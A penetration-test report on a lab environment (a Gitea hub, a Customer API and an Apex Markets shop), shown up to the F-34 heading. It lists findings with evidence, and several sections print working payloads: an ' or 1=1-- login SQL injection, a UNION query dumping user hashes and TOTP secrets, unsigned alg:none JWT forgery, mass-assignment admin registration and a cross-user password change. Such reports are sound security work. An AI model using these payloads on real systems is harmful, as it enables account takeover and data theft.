# Acme Lab Security Assessment Report

Date: 2026-06-11

## Executive Summary

The assessment covered the four in-scope Acme lab services published through the proxy:

- `portal.acme.local` - Acme Internal Ops Portal
- `apex-markets.acme.local` - Apex Markets e-commerce app
- `customer-api.acme.local` - Customer API v2
- `devops-hub.acme.local` - anonymous Gitea code hub

The highest-impact paths found so far are:

1. Anonymous DevOps Hub access exposes infrastructure configuration, internal topology, Vault paths/tokens, DB credentials, and SSH keys, including a key recoverable from Git history.
2. DevOps Hub accepts the weak `developer / developer123` credential pair; that account has admin, pull, and push permissions on all four exposed repositories.
3. Customer API exposes a full plaintext user/password dump without authentication; those credentials allow admin login.
4. Customer API allows authenticated users to read other users' book secrets by title.
5. Customer API allows unauthenticated self-registration as an admin by accepting `admin: true`.
6. Customer API allows one authenticated user to change another user's password.
7. Apex Markets has SQL injection in login, mass-assignment admin registration, broad broken access control, public metrics/configuration endpoints, and public indexed sensitive files.
8. Apex Markets exposes implementation paths and stack traces, making exploit development and vulnerability confirmation easier.
9. Apex Markets ships decryptable sensitive announcements because its Python 2.7 encryption script uses deterministic raw RSA per character.
10. Apex Markets product search is SQL-injectable and can dump user credential hashes and roles.
11. Apex Markets public and low-privilege endpoints expose account metadata, password hashes, security questions, and tokens.
12. Apex Markets accepts forged ownership fields for complaint creation.
13. Apex Markets accepts unsigned `alg:none` JWTs for protected API access.
14. Apex Markets accepts negative basket quantities and permits checkout with manipulated basket contents.
15. Apex Markets lets low-privilege users modify and forge product reviews.
16. Apex Markets accepts zero-star feedback and forged feedback ownership when CAPTCHA fields are supplied.
17. Apex Markets permits automated feedback spam: 12 feedback submissions using disclosed CAPTCHA answers were accepted in 6.5 seconds.
18. Apex Markets grants deluxe membership for a fake/free payment mode.
19. Apex Markets exposes two-factor setup secrets and setup tokens to authenticated clients.
20. Apex Markets product-search SQL injection exposes schema, payment cards, addresses, and account-recovery answer hashes.
21. Apex Markets stores unsalted MD5 password hashes that were cracked offline into valid admin, testing-admin, and deluxe account credentials.
22. Apex Markets client bundle exposes a testing account password that logs in to the lab-domain testing admin account.
23. Apex Markets exposes an unreleased/hidden language file under public static assets.
24. Apex Markets changes passwords via GET query parameters, exposing current and new passwords in URLs.
25. Apex Markets stores iframe JavaScript payloads in product reviews, complaints, and Photo Wall memory captions, creating stored XSS sinks.
26. Apex Markets exposes unauthenticated Web3 listener/control endpoints that start server-side listener behavior and return proxy failures instead of validating malformed Web3 inputs.
27. Portal login content discloses internal wiki/file-share locations and the platform-ops contact identity.
28. Apex Markets sends wildcard CORS headers on sensitive public APIs, allowing arbitrary websites to read exposed configuration, CAPTCHA answers, and memory/user-hash data.
29. Apex Markets stores an unsanitized `True-Client-IP` header value as `lastLoginIp`, allowing attacker-controlled HTML/JavaScript payloads to persist in user records and reappear through authenticated user-list APIs.
30. Apex Markets' deprecated B2B file-upload parser expands XML external entities before returning its 410 error, allowing unauthenticated local file disclosure such as `/etc/passwd`.
31. Apex Markets' upload endpoint accepts double-extension and oversize PDF uploads, bypassing advertised file-type and size controls, although no execution or retrieval path was proven.
32. Apex Markets trusts base64 client-side `couponData` during checkout, allowing expired hard-coded campaign coupons such as `ORANGE2023` and `ORANGE2020` to be redeemed on normal card orders without a valid server-side coupon redemption step.
33. Apex Markets' support chatbot can be coaxed into disclosing a valid 10% coupon code, which the basket API accepts and checkout applies to a normal order.
34. Apex Markets accepts trivially forged Z85 coupon codes such as `n(XRwhz3{H` (`JUN26-99`) for 99% discounts and applies them at checkout.
35. Apex Markets publicly exposes a 12-word Web3 wallet seed phrase in feedback data tied to the `/juicy-nft` flow.
36. Apex Markets allows unauthenticated product tampering through `PUT /api/Products/:id`, changing catalog content visible to all users.
37. Apex Markets exposes order-tracking details without authentication and without ownership checks when a valid order ID is supplied.
38. Apex Markets exposes and accepts its challenge continue-code without authentication, allowing unauthenticated score/progress restoration.
39. Apex Markets accepts unsigned forged 2FA temporary JWTs at `/rest/2fa/verify`, allowing the password-derived temporary token step to be bypassed when the attacker has the account's TOTP secret.
40. Apex Markets has client-side DOM/reflected XSS in the search result and track-result hash routes.
41. Apex Markets registration ignores password confirmation and accepts trivially weak one-character passwords.
42. Apex Markets product-review updates accept NoSQL selector operators, allowing mass modification of reviews.
43. Apex Markets has a review-like race condition: 12 concurrent same-user likes were all accepted for one disposable review, inflating its `likesCount` to 12 and storing the same liker 12 times.
44. Apex Markets accepts forged unsigned `accounting` JWTs for accounting-only order-history APIs, exposing bulk order data and accepting delivery-status updates where normal unauthenticated, customer, and admin contexts are blocked.
45. Apex Markets allows deleted/unlisted products to be added by raw `ProductId` and checked out, including the deleted 2014 Christmas special and a removed unsafe product that public product APIs hide.
46. Apex Markets exposes recycle pickup records by predictable ID without authentication, leaking seeded users' recycle quantities, pickup dates, and internal user/address identifiers.
47. Apex Markets' legacy profile form accepts cross-origin cookie-authenticated username changes without a CSRF token when a valid token cookie is present.

## Coverage Methodology

The objective was not to stop after easy wins. The work used a layered audit framework:

1. **Service inventory**
   - Confirmed the four scoped hostnames respond through the lab proxy.
   - Captured baseline headers, redirects, and unauthenticated landing pages.
   - Verified no direct routing to internal hostnames such as `vault`, `openldap`, `dvwa`, or `wiki.acme.internal`; the edge returns `unknown service`.
   - After user clarification, repeated key probes from inside the Docker toolbox and restricted further testing to lab hostnames only.

2. **Source and artifact review**
   - Enumerated public repositories through Gitea API.
   - Cloned every public repository:
     - `developer/app-config`
     - `developer/infrastructure-scripts`
     - `developer/legacy-deployments`
     - `developer/secrets-rotation-log`
   - Searched both working trees and full Git history for credentials, keys, internal hostnames, Vault paths, and deployment notes.

3. **API specification and route coverage**
   - Downloaded `customer-api.acme.local/openapi.json`.
   - Enumerated every documented path and checked authentication requirements against live behavior.
   - Tested unauthenticated exposure, authenticated user behavior, admin-only behavior, and object-level authorization.

4. **Application route and metadata review**
   - Collected Apex challenge metadata from `/api/Challenges`.
   - Downloaded and inspected Apex client bundle route references.
   - Tested public app endpoints, admin/config endpoints, login, registration, basket APIs, file-server routes, metrics, and known deprecated interfaces.

5. **Exploit validation**
   - Confirmed findings using live HTTP requests and response bodies, not only static hints.
   - Used low-privilege Apex and Customer API accounts where authorization needed proof.
   - Avoided destructive testing except for resettable lab state; Customer API `/createdb` was used to restore seeded data after mutation probes.

## Confirmed Findings

### F-01: Anonymous DevOps Hub exposes all public repositories

**Affected service:** `devops-hub.acme.local`

**Evidence:**

- `GET /api/v1/repos/search?limit=50` anonymously returns all four repositories.
- Each repo has `"private": false` and `"pull": true`.
- Repositories cloned successfully over HTTP without credentials.
- Extended anonymous probing also confirmed recursive tree APIs, raw file reads, web/API archive downloads, subscriber metadata, public API settings, and Swagger documentation are reachable without authentication. Issues, pull requests, releases, labels, milestones, packages, collaborators, keys, and teams did not expose additional sensitive content beyond the already public repositories.

Evidence is saved in:

```text
workspace/scans/docker-gitea-anonymous-surface-probes.csv
workspace/scans/docker-gitea-anonymous-surface-summary.txt
workspace/scans/docker-gitea-extended-surface-probes.csv
workspace/scans/docker-gitea-extended-surface-summary.txt
```

**Impact:** An unauthenticated attacker can collect operational documentation, deployment scripts, secrets, keys, and internal topology.

**Severity:** High

### F-57: DevOps Hub weak developer credentials grant repository admin access

**Affected service:** `devops-hub.acme.local`

**Evidence:**

A Docker-only Gitea credential matrix tested lab-derived usernames, passwords, and token candidates against `GET /api/v1/user`. One pair succeeded:

```text
basic-api-user username=developer secret=developer123 status=200
{"id":1,"login":"developer","email":"developer@acme.internal","is_admin":false,...}
```

A read-only authenticated follow-up using `developer / developer123` confirmed the account owns all four repositories and has repository-level admin, pull, and push permissions:

```text
GET /api/v1/repos/developer/app-config -> permissions={"admin": true, "pull": true, "push": true}
GET /api/v1/repos/developer/infrastructure-scripts -> permissions={"admin": true, "pull": true, "push": true}
GET /api/v1/repos/developer/legacy-deployments -> permissions={"admin": true, "pull": true, "push": true}
GET /api/v1/repos/developer/secrets-rotation-log -> permissions={"admin": true, "pull": true, "push": true}
```

The same follow-up found no additional orgs, teams, user SSH keys, GPG keys, notifications, issues, pulls, releases, repo deploy keys, or hooks in the read-only endpoints tested. No write operation was performed to avoid unnecessary lab-state mutation; the API-reported permissions prove push/admin capability.

Evidence is saved in:

```text
workspace/scripts/gitea_auth_probe.py
workspace/scans/docker-gitea-auth-probes.csv
workspace/scans/docker-gitea-auth-summary.txt
workspace/scripts/gitea_developer_followup_probe.py
workspace/scans/docker-gitea-developer-followup-probes.csv
workspace/scans/docker-gitea-developer-followup-summary.txt
```

**Impact:** An attacker can authenticate as the repository owner with a trivial password and gains write/admin control over all DevOps Hub repositories. This enables source tampering, backdoored deployment scripts, malicious secret-rotation changes, and persistence beyond the anonymous read exposure in F-01/F-02.

**Severity:** High

### F-02: Secrets and infrastructure details committed to public repos

**Affected repos:**

- `developer/app-config`
- `developer/infrastructure-scripts`
- `developer/legacy-deployments`
- `developer/secrets-rotation-log`

**Evidence:**

- `app-config/docker-env.example` contains:
  - `MYSQL_ROOT_PASSWORD=rootpass`
  - `MYSQL_USER=dvwa`
  - `MYSQL_PASSWORD=p@ssw0rd`
  - `VAULT_TOKEN=decoy-readonly-internal-ops-2026q1`
  - `VAULT_ADDR=http://vault:8200`
- `app-config/config.yaml` exposes Vault path `secret/data/api-keys` and notes AppRole is still TODO.
- `infrastructure-scripts/README.md` exposes internal service names and ports: `juice-shop`, `vampi`, `gitea`, `jumpbox`, `openldap`, `dvwa`, `dvwa-db`, and `vault`.
- `legacy-deployments/deploy/keys/legacy_deploy_key` contains an OpenSSH private key.
- `infrastructure-scripts` commit `fd6c9eed2dc5` contains removed `keys/jumpbox_deploy_key`; current `.gitignore` does not remove it from history.
- `secrets-rotation-log/2026-Q1-rotation.md` exposes live/legacy secret paths such as `kv-v2/internal/prod-ops/master-key`.

**Impact:** Attackers gain credentials, secret-store paths, internal hostnames, network layout, and deploy keys from anonymous source access.

**Severity:** High

### F-03: Customer API plaintext credential dump is unauthenticated

**Affected endpoint:** `GET /api/internal/system/users-dump`

**Evidence:**

Unauthenticated request returns:

- `name1 / pass1`
- `name2 / pass2`
- `admin / pass1`
- email addresses
- admin boolean

**Impact:** Complete compromise of seeded API accounts, including admin.

**Severity:** Critical

### F-04: Customer API user enumeration is unauthenticated

**Affected endpoints:**

- `GET /users/v1`
- `GET /users/v1/{username}`

**Evidence:**

Unauthenticated requests returned all usernames and emails, including `admin@mail.com`.

**Impact:** Enables account discovery, targeted credential attacks, and privacy exposure.

**Severity:** Medium

### F-05: Customer API exposes reset/populate endpoint without authentication

**Affected endpoint:** `GET /createdb`

**Evidence:** Unauthenticated request returned `Database populated.`

**Impact:** Any unauthenticated user can reset/repopulate application data, causing integrity and availability impact in the lab API.

**Severity:** Medium

### F-06: Customer API book object-level authorization failure

**Affected endpoint:** `GET /books/v1/{book_title}`

**Evidence:**

1. Logged in as `name1`.
2. Listed public books with `GET /books/v1`.
3. Selected a book owned by `name2`.
4. Requested `GET /books/v1/<name2-book-title>` with `name1` token.
5. API returned `owner: name2` and `secret: secret for <book>`.

**Impact:** Authenticated users can read other users' secret book content.

**Severity:** High

### F-07: Customer API permits empty user registration

**Affected endpoint:** `POST /users/v1/register`

**Evidence:** Request with empty `username`, `email`, and `password` returned success and added a blank user to `GET /users/v1`.

**Impact:** Input validation failure can pollute identity data and may enable downstream auth/logic issues.

**Severity:** Low to Medium

### F-08: Customer API mass-assignment admin registration

**Affected endpoint:** `POST /users/v1/register`

**Evidence:**

Registering a new user with an additional `admin: true` property succeeded:

```json
{"username":"auditadmin","password":"pass1","email":"auditadmin@example.com","admin":true}
```

Logging in as that user and calling `GET /me` returned:

```json
{"data":{"admin":true,"email":"auditadmin@example.com","username":"auditadmin"},"status":"success"}
```

The probe results are saved in `workspace/scans/customer-api-deep-probes.csv`.
Docker reproduction evidence is saved in `workspace/scans/docker-customer-api-critical-probes.csv`.
A later Docker route matrix confirmed that a mass-assigned administrator can perform an admin-only delete operation. In that run, `DELETE /users/v1/<normal-user>` with the mass-assigned admin token returned success, and a follow-up admin read returned `User not found`. Evidence is saved in `workspace/scans/docker-customer-api-matrix-probes.csv`.

**Impact:** Unauthenticated attackers can create administrator accounts in the Customer API.

**Severity:** Critical

### F-09: Customer API cross-user password change

**Affected endpoint:** `PUT /users/v1/{username}/password`

**Evidence:**

With a valid `name1` token, the request below returned `204 No Content`:

```http
PUT /users/v1/name2/password
Authorization: Bearer <name1-token>
Content-Type: application/json

{"password":"newpass"}
```

After the request:

- `name2 / pass2` no longer logged in.
- `name2 / newpass` logged in successfully.
- `name1 / pass1` still logged in.

The test ended with `GET /createdb` to restore seeded Customer API data. Docker reproduction evidence is saved in `workspace/scans/docker-customer-api-critical-probes.csv`.
A later Docker route matrix reconfirmed the issue from a clean seeded state: a `name1` token changed `name2`'s password, `name2/pass2` stopped working, and `name2/MatrixChanged123!` logged in successfully. The same matrix also showed that `/users/v1/name2/email` with a `name1` token changes the authenticated user's email rather than `name2`'s email, so that behavior was not counted as a cross-user email modification. Evidence is saved in `workspace/scans/docker-customer-api-matrix-probes.csv` and summarized in `workspace/scans/docker-customer-api-matrix-summary.txt`.

**Impact:** Any authenticated user can take over another user's API account by changing their password.

**Severity:** Critical

### F-10: Apex Markets SQL injection in login

**Affected endpoint:** `POST /rest/user/login`

**Evidence:**

Payload:

```json
{"email":"' or 1=1--","password":"x"}
```

Response returned a valid JWT for `admin@apex-markets.example` with role `admin`.

**Impact:** Unauthenticated attacker can become admin.

**Severity:** Critical

### F-11: Apex Markets mass-assignment admin registration

**Affected endpoint:** `POST /api/Users/`

**Evidence:**

Supplying `"role":"admin"` during registration created user `test-admin@example.com` with `role:"admin"` and `defaultAdmin.png`.

**Impact:** Unauthenticated privilege escalation to admin.

**Severity:** Critical

### F-12: Apex Markets broken access control exposes users and baskets

**Affected endpoints:**

- `GET /api/Users`
- `GET /rest/basket/{id}`
- `GET /api/BasketItems`

**Evidence:**

A newly registered normal customer token could:

- Read basket `1` and basket `2`, neither owned by the new user.
- Read `/api/Users`, including all user emails, roles, `lastLoginIp`, profile paths, and deluxe tokens.

**Impact:** Any customer can enumerate users and access other users' basket data.

**Severity:** High

### F-13: Apex Markets exposes confidential and sensitive files through indexed FTP

**Affected endpoint:** `GET /ftp`

**Evidence:**

The directory listing exposes:

- `acquisitions.md` - confidential planned acquisitions document
- `announcement_encrypted.md`
- `coupons_2013.md.bak`
- `eastere.gg`
- `encrypt.pyc`
- `incident-support.kdbx`
- `package.json.bak`
- `suspicious_errors.yml`
- `quarantine/`

`/robots.txt` also explicitly disallows `/ftp`, making discovery easier.

**Impact:** Public sensitive document and artifact disclosure.

**Severity:** High

### F-14: Apex Markets file-extension filter bypass

**Affected endpoint:** `GET /ftp/{file}`

**Evidence:**

Direct access to non-allowed extensions returns `403`, but appending `%2500.md` bypasses the filter:

- `/ftp/eastere.gg%2500.md` returned the file.
- `/ftp/suspicious_errors.yml%2500.md` returned the file.
- `/ftp/incident-support.kdbx%2500.md` returned the KeePass database bytes.

**Impact:** Attackers can download files that the app tries to block.

**Severity:** High

### F-15: Apex Markets exposes Prometheus metrics publicly

**Affected endpoint:** `GET /metrics`

**Evidence:** Endpoint returns process, Node.js, and application metrics without authentication.

**Impact:** Operational telemetry disclosure, useful for fingerprinting and monitoring attacks.

**Severity:** Medium

### F-16: Apex Markets exposes admin application configuration publicly

**Affected endpoint:** `GET /rest/admin/application-configuration`

**Evidence:** Endpoint returns server configuration, application domain, OAuth client and authorized redirects, product list, challenge settings, and feature flags without authentication.

**Impact:** Leaks operational and security-relevant application metadata.

**Severity:** Medium to High

### F-17: Apex Markets verbose errors leak stack traces and filesystem paths

**Affected endpoints/examples:**

- `/api/`
- `/api/version`
- `/rest/user/login` with invalid method/body
- `/ftp/eastere.gg`
- `/rest/track-order/'`

**Evidence:** Responses include Express version, `/apex-markets/build/routes/...`, Node module paths, and stack frames.

**Impact:** Fingerprinting and exploit development assistance.

**Severity:** Medium

### F-18: Apex Markets open redirect to allowlisted legacy crypto address

**Affected endpoint:** `GET /redirect?to=...`

**Evidence:** Request to `https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm` returned `302 Found`.

**Impact:** Redirect functionality can be abused for phishing or navigation to stale allowlisted external domains.

**Severity:** Low to Medium

### F-19: Apex Markets announcement encryption is trivially reversible

**Affected artifacts:**

- `GET /ftp/encrypt.pyc%2500.md`
- `GET /ftp/announcement_encrypted.md`

**Evidence:**

`encrypt.pyc` was downloaded from the public FTP area and decompiled as Python 2.7 bytecode. Decompiled source is saved at `workspace/scans/encrypt_decompiled.py`.

The script encrypts each character independently:

```python
encrypted_document.write(str(pow(ord(char), e, N)) + '\n')
```

Because there is no padding and the plaintext unit is one byte, the encrypted announcement was recovered by precomputing `pow(i, 65537, N)` for all 256 byte values and mapping each ciphertext line back to its byte.

Recovered plaintext is saved at:

```text
workspace/loot/apex-ftp/announcement_decrypted.md
```

The decrypted document reveals:

```text
Major Announcement:

Token Sale - Initial Coin Offering
...
URL: /#/tokensale-ico-ea
```

**Impact:** Publicly exposed encrypted material is readable without private-key compromise due to deterministic, per-character raw RSA.

**Severity:** Medium

### F-20: Apex Markets CAPTCHA endpoint discloses answers

**Affected endpoint:** `GET /rest/captcha`

**Evidence:**

An authenticated Docker-toolbox request returned both the CAPTCHA challenge and the answer:

```json
{"captchaId":3,"captcha":"6+5-10","answer":"1"}
```

Evidence is saved in `workspace/scans/docker-apex-auth-critical-probes.csv`.

**Impact:** Any client can bypass CAPTCHA validation because the server sends the expected answer with the challenge.

**Severity:** Medium

### F-58: Apex Markets permits automated feedback spam with disclosed CAPTCHA answers

**Affected endpoints:**

- `GET /rest/captcha`
- `POST /api/Feedbacks/`

**Evidence:**

Building on F-20, a Docker-only bulk-feedback probe requested a fresh CAPTCHA before each feedback submission, used the disclosed `answer` value, and submitted 12 feedback records with a unique marker.

The probe completed in under 20 seconds:

```text
marker=bulk-captcha-probe-1781187976
attempted_feedbacks=12
accepted_feedbacks=12
matched_feedbacks_after=12
elapsed_seconds=6.497
status_counts={"200": 13, "201": 12}
accepted_ids=19,20,21,22,23,24,25,26,27,28,29,30
first_match=id:19 rating:5 comment:bulk-captcha-probe-1781187976-0
last_match=id:30 rating:5 comment:bulk-captcha-probe-1781187976-11
```

Evidence is saved in:

```text
workspace/scripts/apex_captcha_bulk_feedback_probe.py
workspace/scans/docker-apex-captcha-bulk-feedback-probes.csv
workspace/scans/docker-apex-captcha-bulk-feedback-summary.txt
```

**Impact:** The feedback CAPTCHA does not provide effective anti-automation protection. Any unauthenticated client can fetch CAPTCHA answers from the server and submit many feedback records quickly, enabling feedback spam, rating manipulation, and storage pollution.

**Severity:** Medium

### F-21: Apex Markets saveLoginIp leaks password hash

**Affected endpoint:** `GET /rest/saveLoginIp`

**Evidence:**

An authenticated low-privilege Docker-toolbox request returned the caller's user object, including the password hash:

```json
{"email":"dockeraudit1781173678@example.com","password":"05827d098bccfd3d461ef56a18329d56","role":"customer"}
```

Evidence is saved in `workspace/scans/docker-apex-auth-critical-probes.csv`.

**Impact:** The server exposes password material unnecessarily. Even though this probe returned the caller's hash, password hashes should never be returned to clients.

**Severity:** Medium

### F-22: Apex Markets product search SQL injection dumps user credentials

**Affected endpoint:** `GET /rest/products/search?q=...`

**Evidence:**

A Docker-toolbox probe used a UNION payload against product search:

```text
/rest/products/search?q=')) UNION SELECT id,email,password,role,deluxeToken,totpSecret,profileImage,username,createdAt FROM Users--
```

The response returned user rows inside the product result shape. The evidence summary saved at `workspace/scans/docker-apex-gap-evidence-summary.txt` shows:

```text
product_search_union_sqli_status=200
product_search_union_sqli_user_rows=19
product_search_union_sqli_first_email=admin@apex-markets.example
product_search_union_sqli_first_hash=0192023a7bbd73250516f069df18b500
product_search_union_sqli_first_role=admin
```

Raw probe output is saved in `workspace/scans/docker-apex-gap-probes.csv`.

**Impact:** Unauthenticated attackers can extract Apex user emails, roles, password hashes, deluxe tokens, TOTP secrets, profile image paths, and timestamps from the backing database.

**Severity:** Critical

### F-23: Apex Markets public memories expose embedded user records

**Affected endpoint:** `GET /rest/memories`

**Evidence:**

Unauthenticated request returned memory entries with nested `User` objects. The evidence summary shows:

```text
unauth_memories_status=200
unauth_memories_embedded_user_email=bjoern@owasp.org
unauth_memories_embedded_user_password_hash=9283f1b2e9669749081963be0462e466
unauth_memories_embedded_user_deluxe_token_len=64
```

A follow-up read-only Docker probe confirmed the same public memory record also exposes Bjoern's cat-photo caption, an unencoded public image path containing Unicode glyphs and raw `#` characters, the profile image path, and the nested password hash. The fully percent-encoded memory image path returns a JPEG, while leaving the `#` characters raw causes the SPA shell to be returned instead of the image:

```text
memory_user=bjoern@owasp.org
caption=😼 #zatschi #whoneedsfourlegs
api_image_path=assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg
profile_image=assets/public/images/uploads/13.jpg
nested_user_hash=9283f1b2e9669749081963be0462e466
unicode-encoded-hash-raw status=200 type=text/html; charset=UTF-8
unicode-and-hash-encoded status=200 type=image/jpeg len=19028
profile-image status=200 type=image/jpeg len=13755
```

Additional evidence is saved in:

```text
workspace/scripts/apex_memory_encoding_probe.py
workspace/scans/docker-apex-memory-encoding-probes.csv
workspace/scans/docker-apex-memory-encoding-summary.txt
```

**Impact:** Public endpoint exposes account metadata, password hashes, deluxe tokens, profile image paths, account state, and private-looking media paths for users referenced by memories. The unencoded image path also demonstrates missing output/path encoding for public media references.

**Severity:** High

### F-24: Apex Markets exposes password-reset security questions without authentication

**Affected endpoint:** `GET /rest/user/security-question?email=...`

**Evidence:**

Unauthenticated request for the admin account returned the configured reset question:

```text
unauth_admin_security_question_status=200
unauth_admin_security_question=Mother's maiden name?
```

**Impact:** Attackers can enumerate password-reset questions for known emails, reducing the entropy of account recovery attacks and enabling targeted social engineering.

**Severity:** Medium

### F-25: Apex Markets low-privilege users can read authentication details for all accounts

**Affected endpoint:** `GET /rest/user/authentication-details/`

**Evidence:**

Using an authenticated Apex token, the endpoint returned records for 26 users. The evidence summary shows:

```text
customer_access_authentication_details_status=200
customer_access_authentication_details_count=26
customer_access_authentication_details_first_email=admin@apex-markets.example
customer_access_authentication_details_fields=createdAt,deletedAt,deluxeToken,email,id,isActive,lastLoginIp,lastLoginTime,password,profileImage,role,totpSecret,updatedAt,username
```

The password values in this response are masked, but the endpoint still exposes authentication metadata, roles, profile paths, TOTP fields, login timestamps, and account state to a low-privilege user.

**Impact:** Any authenticated customer can enumerate sensitive authentication metadata for all accounts.

**Severity:** High

### F-26: Apex Markets complaint creation accepts forged UserId

**Affected endpoint:** `POST /api/Complaints/`

**Evidence:**

A Docker-toolbox probe registered a normal Apex customer account, then submitted a complaint with `UserId: 1` in the request body:

```json
{"message":"artifact probe","UserId":1}
```

The API accepted the supplied owner field:

```text
complaints-post-basic 201 {"status":"success","data":{"id":2,"message":"artifact probe","UserId":1,...}}
```

Raw evidence is saved in `workspace/scans/docker-apex-artifact-probes.csv`.

**Impact:** Low-privilege users can forge complaint ownership and create records attributed to another user ID, including admin ID `1`.

**Severity:** Medium

### F-27: Apex Markets exposes hidden private assets and outdated dependency inventory

**Affected endpoints/artifacts:**

- `GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`
- `GET /assets/private/three.js`
- `GET /assets/private/OrbitControls.js`
- `GET /ftp/package.json.bak%2500.md`

**Evidence:**

The hidden route from `eastere.gg` is publicly reachable and references private assets:

```text
hidden_easter_path_status=200
hidden_easter_path_title_present=True
hidden_easter_path_private_threejs_ref=True
hidden_easter_path_private_orbitcontrols_ref=True
/assets/private/three.js_status=200
/assets/private/OrbitControls.js_status=200
```

The public FTP backup `package.json.bak` discloses an old Juice Shop dependency inventory, including packages such as `express-jwt: 0.1.3`, `js-yaml: 3.10`, `libxmljs: ~0.18`, `sanitize-html: 1.4.2`, and `sqlite3: ~3.1.13`.

A Docker-local dependency/supply-chain audit parsed the same leaked manifest and found 39 runtime dependencies plus 35 development dependencies. Ten packages were tied to already proven local behavior: `express-jwt` to unsigned JWT acceptance, `libxmljs` to XXE local-file disclosure, `marsdb` to NoSQL selector injection, `z85` to coupon forgery, `serve-index` to indexed FTP exposure, and related parser/sanitizer/database packages. A bounded near-miss list for obvious typo package names found 0 hits, so no additional typosquatting finding was claimed from local evidence alone. Evidence is saved in `workspace/scans/docker-apex-dependency-supply-chain-audit.csv` and `workspace/scans/docker-apex-dependency-supply-chain-audit-summary.txt`.

**Impact:** Hidden/private application resources and dependency metadata are exposed to unauthenticated users, aiding fingerprinting and targeted exploit selection. The private assets checked so far appear to be standard Three.js files and did not contain obvious secrets.

**Severity:** Low to Medium

### F-28: Apex Markets accepts unsigned JWTs

**Affected endpoints/examples:**

- `GET /api/Users`
- `GET /rest/user/authentication-details/`

**Evidence:**

A Docker-toolbox probe generated a JWT with header `{"alg":"none","typ":"JWT"}`, an admin-looking payload, and no signature. The token was accepted by protected API routes:

```text
token_header_alg=none
token_has_signature=False
api_users_status=200
api_users_contains_admin=True
api_users_contains_roles=True
authentication_details_status=200
authentication_details_contains_admin=True
```

Evidence is saved in `workspace/scans/docker-apex-jwt-none-evidence.txt`. The broader JWT candidate probe is saved in `workspace/scans/docker-apex-remaining-probes.csv`.

A follow-up route matrix generated unsigned `alg:none` tokens for admin, Jim, and Bjoern-shaped payloads. The forged tokens were accepted by `/api/Users` and `/rest/user/authentication-details/` for each tested identity, while more stateful routes such as `/rest/2fa/status`, `/api/Addresss`, `/api/Cards`, `/rest/wallet/balance`, and `/rest/user/data-export` rejected them with `401`. `/rest/order-history` returned a verbose 500 stack trace after detecting illegal activity. Evidence is saved in `workspace/scans/docker-apex-jwt-chain-probes.csv`.

**Impact:** Attackers can forge unsigned tokens and access protected Apex APIs without knowing a signing secret.

**Severity:** Critical

### F-29: Apex Markets accepts negative basket quantities

**Affected endpoints:**

- `POST /api/BasketItems/`
- `POST /rest/basket/{id}/checkout`

**Evidence:**

A Docker-toolbox probe created a fresh customer, used the `bid` returned by login, and submitted a negative quantity item to that user's own basket:

```text
registered_email=basketctx1781175238@example.com
derived_bid=6
basketitem-negative-basket-6_status=200
basketitem-negative-basket-6_sample={"status":"success","data":{"id":10,"ProductId":2,"BasketId":6,"quantity":-50,...}}
checkout-own-wallet_status=200
checkout-own-wallet_sample={"orderConfirmation":"1deb-d4f9b43279a412aa"}
```

Evidence is saved in `workspace/scans/docker-apex-basket-context-probes.csv` and `workspace/scans/docker-apex-basket-context-summary.txt`.

**Impact:** Attackers can manipulate basket totals with negative quantities and complete checkout with tampered contents.

**Severity:** High

### F-30: Apex Markets product reviews can be modified or forged by low-privilege users

**Affected endpoints:**

- `PATCH /rest/products/reviews`
- `PUT /rest/products/{id}/reviews`

**Evidence:**

A fresh low-privilege customer modified an existing admin-authored review:

```text
review-patch-valid-id 200
{"modified":1,"original":[{"message":"One of my favorites!","author":"admin@apex-markets.example",...}],"updated":[{"message":"isolated patch","author":"admin@apex-markets.example",...}]}
```

The same customer created a new review while setting the author to the admin email:

```text
review-create-forged-author 201
reviews-get-product1-after ... {"message":"forged isolated review","author":"admin@apex-markets.example",...}
```

Evidence is saved in `workspace/scans/docker-apex-review-feedback-probes.csv`.

**Impact:** Low-privilege users can tamper with existing product review content and forge review authorship.

**Severity:** High

### F-31: Apex Markets feedback accepts zero ratings and forged UserId

**Affected endpoint:** `POST /api/Feedbacks/`

**Evidence:**

Using fresh CAPTCHA values from `/rest/captcha`, Docker-toolbox probes submitted feedback with `rating:0` and with a forged `UserId:1`. Both were accepted:

```text
captcha_body={"answer": "2", "captcha": "2*1*1", "captchaId": 0}
feedback-valid-captcha-zero 201 {"status":"success","data":{"id":10,"comment":"zero valid 1781175481","rating":0,...,"UserId":null}}
feedback-valid-captcha-forged-user 201 {"status":"success","data":{"id":11,"comment":"forged user valid 1781175481","rating":5,"UserId":1,...}}
```

Follow-up enumeration confirmed both records:

```text
zero_valid_matches=1
zero_valid_last=UserId:None rating:0 comment:zero valid 1781175481
forged_user_valid_matches=1
forged_user_valid_last=UserId:1 rating:5 comment:forged user valid 1781175481
```

Evidence is saved in `workspace/scans/docker-apex-feedback-captcha-probes.csv` and `workspace/scans/docker-apex-feedback-captcha-summary.txt`.

**Impact:** Attackers can bypass intended rating constraints and create feedback attributed to arbitrary user IDs.

**Severity:** Medium

### F-32: Apex Markets grants deluxe membership for free payment mode

**Affected endpoint:** `POST /rest/deluxe-membership`

**Evidence:**

A Docker-toolbox probe registered a fresh customer and called the deluxe upgrade endpoint with a fake free payment mode:

```json
{"paymentMode":"free","paymentId":"free"}
```

The server granted deluxe membership and returned a new token with `role:"deluxe"`:

```text
deluxe-upgrade-free_status=200
deluxe-upgrade-free_sample={"status":"success","data":{"confirmation":"Congratulations! You are now a deluxe member!","token":"...","role":"deluxe",...}}
```

Evidence is saved in `workspace/scans/docker-apex-account-payment-probes.csv` and `workspace/scans/docker-apex-account-payment-summary.txt`.

**Impact:** Any authenticated customer can upgrade to deluxe membership without valid payment.

**Severity:** High

### F-33: Apex Markets exposes 2FA setup secrets and setup tokens

**Affected endpoint:** `GET /rest/2fa/status`

**Evidence:**

An authenticated customer request returned the TOTP setup secret and a setup token:

```text
2fa-status_status=200
2fa-status_sample={"setup":false,"secret":"ARDVAETNFNYGIMDG","email":"acctpay1781175798@example.com","setupToken":"..."}
```

Evidence is saved in `workspace/scans/docker-apex-account-payment-probes.csv` and `workspace/scans/docker-apex-account-payment-summary.txt`.

**Impact:** The application exposes 2FA enrollment secrets to the client before setup. This is likely part of the enrollment flow, but it also means any script or compromised browser context with the user token can retrieve the raw TOTP secret directly.

**Severity:** Low to Medium

### F-34: Apex Markets product-search SQL injection exposes broader database contents

